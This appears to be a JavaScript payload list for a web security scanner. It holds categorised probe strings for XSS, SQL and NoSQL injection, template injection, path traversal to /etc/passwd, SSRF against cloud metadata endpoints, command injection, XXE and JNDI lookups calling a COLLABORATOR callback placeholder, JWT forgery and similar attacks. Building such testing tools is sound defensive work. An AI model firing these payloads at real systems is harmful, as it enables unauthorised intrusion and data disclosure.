export const PAYLOADS = [
  {
    category: "XSS",
    payloads: [
      { value: "<script>alert(1)</script>", note: "Basic script context" },
      { value: "\"><img src=x onerror=alert(1)>", note: "Double-quoted attribute breakout" },
      { value: "'><img src=x onerror=alert(1)>", note: "Single-quoted attribute breakout" },
      { value: "<svg/onload=alert(1)>", note: "Compact SVG event" },
      { value: "<details open ontoggle=alert(1)>", note: "Toggle event handler" },
      { value: "<input autofocus onfocus=alert(1)>", note: "Focus event handler" },
      { value: "<body onpageshow=alert(1)>", note: "Body event handler" },
      { value: "javascript:alert(document.domain)", note: "JavaScript URL" },
      { value: "data:text/html,<script>alert(1)</script>", note: "Data URL" },
      { value: "</script><script>alert(1)</script>", note: "Script block termination" },
      { value: "\\'-alert(1)//", note: "Single-quoted JavaScript string" },
      { value: "\"-alert(1)//", note: "Double-quoted JavaScript string" },
      { value: "${alert(1)}", note: "JavaScript template literal interpolation" },
      { value: "<a href=javascript:alert(1)>click</a>", note: "Unquoted href" },
      { value: "{{constructor.constructor('alert(1)')()}}", note: "Angular-style expression probe" }
    ]
  },
  {
    category: "SQLi",
    payloads: [
      { value: "'", note: "Single-quote syntax probe" },
      { value: "\"", note: "Double-quote syntax probe" },
      { value: "' OR '1'='1'-- -", note: "String-context Boolean true" },
      { value: "' AND '1'='2'-- -", note: "String-context Boolean false" },
      { value: "1 OR 1=1", note: "Numeric-context Boolean true" },
      { value: "1 AND 1=2", note: "Numeric-context Boolean false" },
      { value: "' OR 1=1#", note: "MySQL hash-comment variant" },
      { value: "') OR ('1'='1'-- -", note: "Parenthesised expression breakout" },
      { value: "' UNION SELECT NULL-- -", note: "Single-column UNION probe" },
      { value: "' UNION SELECT NULL,NULL-- -", note: "Two-column UNION probe" },
      { value: "' ORDER BY 1-- -", note: "Column-count probe" },
      { value: "' AND SLEEP(5)-- -", note: "MySQL time-delay probe" },
      { value: "'; WAITFOR DELAY '0:0:5'--", note: "MSSQL time-delay probe" },
      { value: "' || pg_sleep(5)--", note: "PostgreSQL time-delay probe" },
      { value: "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", note: "PostgreSQL scalar delay" },
      { value: "' AND DBMS_PIPE.RECEIVE_MESSAGE('S',5)=0--", note: "Oracle time-delay probe" }
    ]
  },
  {
    category: "SSTI",
    payloads: [
      { value: "{{7*7}}", note: "Jinja/Twig-style arithmetic" },
      { value: "${7*7}", note: "EL/Freemarker-style arithmetic" },
      { value: "#{7*7}", note: "Ruby/EL interpolation" },
      { value: "<%= 7*7 %>", note: "ERB/EJS-style expression" },
      { value: "{{7*'7'}}", note: "Jinja versus Twig fingerprint" },
      { value: "${{7*7}}", note: "Nested expression probe" },
      { value: "*{7*7}", note: "Spring expression selection syntax" },
      { value: "@(7*7)", note: "Razor-style expression probe" },
      { value: "[[${7*7}]]", note: "Thymeleaf inlining probe" },
      { value: "${T(java.lang.Math).abs(-49)}", note: "Spring EL type-access probe" }
    ]
  },
  {
    category: "Path Traversal & LFI",
    payloads: [
      { value: "../../../../etc/passwd", note: "Unix traversal" },
      { value: "..\\..\\..\\..\\windows\\win.ini", note: "Windows traversal" },
      { value: "..%2f..%2f..%2fetc%2fpasswd", note: "URL-encoded separators" },
      { value: "..%5c..%5c..%5cwindows%5cwin.ini", note: "Encoded Windows separators" },
      { value: "..%252f..%252f..%252fetc%252fpasswd", note: "Double-encoded separators" },
      { value: "....//....//....//etc/passwd", note: "Collapsed-separator bypass" },
      { value: "..;/..;/..;/etc/passwd", note: "Semicolon parser differential" },
      { value: "/etc/passwd", note: "Absolute Unix path" },
      { value: "C:\\Windows\\win.ini", note: "Absolute Windows path" },
      { value: "php://filter/convert.base64-encode/resource=index.php", note: "PHP filter wrapper" },
      { value: "file:///etc/hostname", note: "File URI probe" },
      { value: "/proc/self/environ", note: "Linux process environment path" }
    ]
  },
  {
    category: "SSRF",
    payloads: [
      { value: "http://127.0.0.1/", note: "IPv4 loopback" },
      { value: "http://127.1/", note: "Short IPv4 loopback" },
      { value: "http://[::1]/", note: "IPv6 loopback" },
      { value: "http://2130706433/", note: "Decimal loopback notation" },
      { value: "http://0x7f000001/", note: "Hex loopback notation" },
      { value: "http://0177.0.0.1/", note: "Octal loopback notation" },
      { value: "http://localhost/", note: "Loopback hostname" },
      { value: "http://localhost.example.com/", note: "Hostname suffix validation probe" },
      { value: "http://example.com@127.0.0.1/", note: "User-info parser differential" },
      { value: "http://169.254.169.254/latest/meta-data/", note: "AWS-compatible metadata probe" },
      { value: "http://metadata.google.internal/computeMetadata/v1/", note: "GCP metadata probe" },
      { value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", note: "Azure metadata probe" },
      { value: "http://COLLABORATOR/", note: "Out-of-band callback placeholder" }
    ]
  },
  {
    category: "Command Injection",
    payloads: [
      { value: "; id", note: "Unix command separator" },
      { value: "| id", note: "Unix pipeline" },
      { value: "|| id", note: "Unix fallback execution" },
      { value: "&& whoami", note: "Conditional execution" },
      { value: "$(id)", note: "Shell substitution" },
      { value: "`id`", note: "Legacy shell substitution" },
      { value: "%0aid", note: "Encoded newline separator" },
      { value: "${IFS}id", note: "Shell whitespace bypass" },
      { value: "& whoami", note: "Windows command separator" },
      { value: "| timeout /T 5", note: "Windows time-delay probe" },
      { value: "; sleep 5", note: "Unix time-delay probe" }
    ]
  },
  {
    category: "XXE",
    payloads: [
      {
        value: "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY probe SYSTEM \"file:///etc/hostname\">]><x>&probe;</x>",
        note: "Local file entity probe"
      },
      {
        value: "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY probe SYSTEM \"http://127.0.0.1/\">]><x>&probe;</x>",
        note: "Network entity probe"
      },
      {
        value: "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY probe SYSTEM \"http://COLLABORATOR/xxe\">]><x>&probe;</x>",
        note: "Out-of-band entity placeholder"
      },
      {
        value: "<?xml version=\"1.0\"?><!DOCTYPE x SYSTEM \"http://COLLABORATOR/probe.dtd\"><x/>",
        note: "External DTD placeholder"
      },
      {
        value: "<!DOCTYPE svg [<!ENTITY probe SYSTEM \"file:///etc/hostname\">]><svg><text>&probe;</text></svg>",
        note: "SVG entity probe"
      },
      {
        value: "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % p SYSTEM \"http://COLLABORATOR/p.dtd\">%p;]><x/>",
        note: "Parameter entity placeholder"
      }
    ]
  },
  {
    category: "NoSQLi",
    payloads: [
      { value: "{\"$ne\":null}", note: "MongoDB not-equal operator" },
      { value: "{\"$gt\":\"\"}", note: "MongoDB greater-than operator" },
      { value: "{\"$regex\":\".*\"}", note: "MongoDB regex operator" },
      { value: "{\"$exists\":true}", note: "MongoDB field-existence operator" },
      { value: "{\"$in\":[\"admin\"]}", note: "MongoDB set-membership operator" },
      { value: "username[$ne]=invalid&password[$ne]=invalid", note: "Nested query-string operators" },
      { value: "username[$regex]=.*", note: "Query-string regex operator" },
      { value: "{\"username\":{\"$ne\":\"invalid\"},\"password\":{\"$ne\":\"invalid\"}}", note: "JSON authentication logic probe" }
    ]
  },
  {
    category: "Open Redirect",
    payloads: [
      { value: "https://example.com", note: "Absolute URL" },
      { value: "//example.com", note: "Protocol-relative URL" },
      { value: "///example.com", note: "Multiple-slash normalisation" },
      { value: "https://trusted.example@example.com", note: "User-info confusion" },
      { value: "https://example.com@trusted.example", note: "Reversed user-info confusion" },
      { value: "/\\example.com", note: "Slash/backslash parser differential" },
      { value: "https:%2f%2fexample.com", note: "Encoded URL separators" },
      { value: "%2f%2fexample.com", note: "Encoded protocol-relative URL" },
      { value: "https://example.com%23.trusted.example", note: "Encoded fragment confusion" }
    ]
  },
  {
    category: "CRLF Injection",
    payloads: [
      { value: "%0d%0aX-Spectre-Probe:%201", note: "Encoded CRLF header probe" },
      { value: "%0aX-Spectre-Probe:%201", note: "Line-feed-only header probe" },
      { value: "%0dX-Spectre-Probe:%201", note: "Carriage-return-only probe" },
      { value: "%250d%250aX-Spectre-Probe:%25201", note: "Double-encoded CRLF" },
      { value: "%E5%98%8A%E5%98%8DX-Spectre-Probe:%201", note: "Unicode truncation probe" },
      { value: "\\r\\nX-Spectre-Probe: 1", note: "Literal escaped form" }
    ]
  },
  {
    category: "LDAP Injection",
    payloads: [
      { value: "*", note: "Wildcard probe" },
      { value: "*)(&", note: "Filter termination probe" },
      { value: "*)(uid=*))(|(uid=*", note: "Filter logic probe" },
      { value: "admin)(&)", note: "Conjunction filter probe" },
      { value: "\\2a", note: "Escaped wildcard control" }
    ]
  },
  {
    category: "XPath Injection",
    payloads: [
      { value: "'", note: "XPath string syntax probe" },
      { value: "' or '1'='1", note: "Boolean true probe" },
      { value: "' and '1'='2", note: "Boolean false control" },
      { value: "' or 1=1 or 'a'='b", note: "Numeric Boolean probe" },
      { value: "'] | //* | //*['", note: "Node-set union probe" },
      { value: "' or contains(.,'admin') or '1'='2", note: "Function evaluation probe" }
    ]
  },
  {
    category: "GraphQL",
    payloads: [
      { value: "{__typename}", note: "Minimal schema reachability query" },
      { value: "query{__schema{queryType{name}}}", note: "Introspection availability probe" },
      { value: "query{__type(name:\"Query\"){fields{name}}}", note: "Query field enumeration" },
      { value: "query Probe($id:ID!){node(id:$id){__typename}}", note: "Global node interface probe" },
      { value: "query{a:__typename b:__typename c:__typename}", note: "Alias handling probe" },
      { value: "query{__schema{types{name kind}}}", note: "Type-name introspection" },
      { value: "mutation{__typename}", note: "Mutation endpoint parsing probe" }
    ]
  },
  {
    category: "HTTP Parameter Pollution",
    payloads: [
      { value: "role=user&role=admin", note: "Duplicate scalar parameter" },
      { value: "id=1&id=2", note: "Duplicate numeric parameter" },
      { value: "redirect=/safe&redirect=//example.com", note: "Duplicate redirect parameter" },
      { value: "scope=read&scope=write", note: "Duplicate OAuth-style scope" },
      { value: "item[]=one&item[]=two", note: "Array coercion syntax" },
      { value: "user[name]=alice&user[role]=admin", note: "Nested-object coercion" }
    ]
  },
  {
    category: "Host & Cache Headers",
    payloads: [
      { value: "Host: example.com", note: "Host override probe" },
      { value: "X-Forwarded-Host: example.com", note: "Forwarded host probe" },
      { value: "X-Host: example.com", note: "Alternate host header" },
      { value: "X-Original-URL: /admin", note: "Original URL routing probe" },
      { value: "X-Rewrite-URL: /admin", note: "Rewrite URL routing probe" },
      { value: "X-Forwarded-Scheme: http", note: "Forwarded scheme probe" },
      { value: "X-Forwarded-Port: 80", note: "Forwarded port probe" },
      { value: "X-Forwarded-Prefix: /spectre-probe", note: "Forwarded path-prefix probe" }
    ]
  },
  {
    category: "CORS Origins",
    payloads: [
      { value: "https://example.com", note: "Untrusted HTTPS origin" },
      { value: "null", note: "Opaque/null origin" },
      { value: "https://trusted.example.example.com", note: "Trusted-name prefix" },
      { value: "https://trusted-example.com", note: "Trusted-name substring" },
      { value: "https://example.com.trusted.example", note: "Trusted-name suffix" },
      { value: "http://trusted.example", note: "Scheme downgrade" },
      { value: "https://trusted.example:444", note: "Non-standard port" },
      { value: "https://trusted.example@example.com", note: "User-info origin confusion" }
    ]
  },
  {
    category: "File Upload",
    payloads: [
      { value: "probe.php.jpg", note: "Double-extension filename" },
      { value: "probe.jpg.php", note: "Executable final extension" },
      { value: "probe.php%00.jpg", note: "Encoded null-byte filename" },
      { value: "probe.php.", note: "Trailing-dot normalisation" },
      { value: "probe.PhP", note: "Case-sensitive extension filter" },
      { value: "../probe.txt", note: "Filename traversal" },
      { value: "image/svg+xml", note: "Active SVG media type" },
      { value: "application/octet-stream", note: "Generic binary media type" },
      { value: "<svg xmlns=\"http://www.w3.org/2000/svg\"><text>SPECTRE</text></svg>", note: "Benign SVG upload body" }
    ]
  },
  {
    category: "Prototype Pollution",
    payloads: [
      { value: "{\"__proto__\":{\"spectreProbe\":true}}", note: "JSON __proto__ property" },
      { value: "{\"constructor\":{\"prototype\":{\"spectreProbe\":true}}}", note: "Constructor prototype path" },
      { value: "__proto__[spectreProbe]=true", note: "Bracket query-string syntax" },
      { value: "__proto__.spectreProbe=true", note: "Dot query-string syntax" },
      { value: "constructor[prototype][spectreProbe]=true", note: "Constructor bracket syntax" },
      { value: "constructor.prototype.spectreProbe=true", note: "Constructor dot syntax" },
      { value: "{\"prototype\":{\"spectreProbe\":true}}", note: "Prototype property control" }
    ]
  },
  {
    category: "JWT",
    payloads: [
      { value: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.", note: "Unsigned alg:none token" },
      { value: "{\"alg\":\"none\",\"typ\":\"JWT\"}", note: "Unsigned header JSON" },
      { value: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", note: "HMAC header JSON" },
      { value: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"kid\":\"probe\"}", note: "Key ID header probe" },
      { value: "{\"alg\":\"RS256\",\"jku\":\"https://COLLABORATOR/jwks.json\"}", note: "Remote JWK Set placeholder" },
      { value: "{\"alg\":\"RS256\",\"kid\":\"../../probe\"}", note: "Key ID traversal probe" }
    ]
  },
  {
    category: "OAuth & Redirect URI",
    payloads: [
      { value: "https://example.com/callback", note: "Unregistered absolute callback" },
      { value: "https://trusted.example/callback/../redirect", note: "Path normalisation callback" },
      { value: "https://trusted.example/callback?next=https://example.com", note: "Chained redirect callback" },
      { value: "https://trusted.example@example.com/callback", note: "User-info callback confusion" },
      { value: "https://trusted.example.evil.example/callback", note: "Subdomain suffix callback" },
      { value: "https://trusted.example/callback%23@example.com", note: "Encoded fragment callback" },
      { value: "com.example.app:/oauth2redirect", note: "Custom URI scheme callback" }
    ]
  },
  {
    category: "Mass Assignment",
    payloads: [
      { value: "\"role\":\"admin\"", note: "Role field fragment" },
      { value: "\"isAdmin\":true", note: "Administrative Boolean fragment" },
      { value: "\"verified\":true", note: "Verification Boolean fragment" },
      { value: "\"status\":\"approved\"", note: "Workflow status fragment" },
      { value: "\"ownerId\":\"1\"", note: "Ownership field fragment" },
      { value: "\"permissions\":[\"admin\"]", note: "Permissions array fragment" },
      { value: "\"price\":0", note: "Server-controlled numeric field" }
    ]
  },
  {
    category: "IDOR",
    payloads: [
      { value: "0", note: "Zero identifier boundary" },
      { value: "1", note: "Low sequential identifier" },
      { value: "-1", note: "Negative identifier boundary" },
      { value: "2147483647", note: "Signed 32-bit maximum" },
      { value: "00000000-0000-0000-0000-000000000000", note: "Nil UUID" },
      { value: "ffffffff-ffff-ffff-ffff-ffffffffffff", note: "Maximum UUID" },
      { value: "current", note: "Current-user alias" },
      { value: "me", note: "Self-resource alias" }
    ]
  },
  {
    category: "Log Injection",
    payloads: [
      { value: "spectre-probe%0aINFO:%20forged-entry", note: "Encoded newline log entry" },
      { value: "spectre-probe\\nINFO: forged-entry", note: "Escaped newline log entry" },
      { value: "spectre-probe\r\nINFO: forged-entry", note: "Literal CRLF log entry" },
      { value: "${jndi:ldap://COLLABORATOR/probe}", note: "JNDI lookup detection placeholder" },
      { value: "${${lower:j}ndi:ldap://COLLABORATOR/probe}", note: "Nested JNDI lookup placeholder" }
    ]
  },
  {
    category: "CSV Formula Injection",
    payloads: [
      { value: "=1+1", note: "Formula evaluation probe" },
      { value: "+1+1", note: "Plus-prefixed formula probe" },
      { value: "-1+2", note: "Minus-prefixed formula probe" },
      { value: "@SUM(1+1)", note: "At-sign formula probe" },
      { value: "\t=1+1", note: "Tab-prefixed formula probe" },
      { value: "\r=1+1", note: "Carriage-return-prefixed formula probe" }
    ]
  },
  {
    category: "JSON & Type Confusion",
    payloads: [
      { value: "null", note: "Null scalar" },
      { value: "true", note: "Boolean scalar" },
      { value: "[]", note: "Empty array" },
      { value: "{}", note: "Empty object" },
      { value: "{\"id\":[1,2]}", note: "Array-for-scalar coercion" },
      { value: "{\"id\":{\"value\":1}}", note: "Object-for-scalar coercion" },
      { value: "{\"id\":1,\"id\":2}", note: "Duplicate JSON key" },
      { value: "{\"value\":1e309}", note: "Non-finite numeric boundary" },
      { value: "{\"value\":-0}", note: "Negative-zero numeric boundary" }
    ]
  }
];
